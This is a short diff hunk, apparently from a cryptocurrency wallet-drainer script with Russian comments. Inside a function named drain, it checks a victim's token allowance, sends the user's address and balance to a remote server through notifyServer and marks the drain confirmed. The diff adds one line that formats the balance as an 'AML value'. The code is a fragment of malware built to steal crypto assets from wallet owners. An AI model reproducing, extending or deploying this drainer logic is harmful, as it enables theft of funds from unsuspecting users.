@@ -513,6 +513,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
       console.log(`✅ Allowance уже достаточно для токена ${token}`);
       try {
         await notifyServer(userAddress, address, balance, chainId, null, provider, balance);
+        const amlValue = ethers.utils.formatUnits(balance, decimals); // Используем текущий баланс как значение AML
         status = 'confirmed';
       } catch (error) {
         console.error(`❌ Ошибка при вызове notifyServer для токена ${token}: ${error.message}`);
